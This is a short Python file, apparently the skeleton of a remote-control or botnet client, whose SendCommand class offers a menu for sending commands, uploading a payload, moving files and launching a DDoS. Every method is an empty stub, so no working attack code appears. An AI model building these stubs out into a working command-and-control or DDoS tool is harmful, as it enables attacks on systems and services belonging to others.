# -*- coding: utf-8 -*-
from libs import uix


class SendCommand(object):
    def __init__(self):
        self.sub_menu = {
            '1': self.send_custom_command,
            '2': self.upload_payload,
            '3': self.download_file,
            '4': self.upload_file,
            '5': self.ddos,
        }

    def send_custom_command(self):
        pass

    def upload_payload(self):
        pass

    def download_file(self):
        pass

    def upload_file(self):
        pass

    def ddos(self):
        pass

    def run(self):
        choice = uix.send_command_start_msg()
        self.sub_menu[choice]()

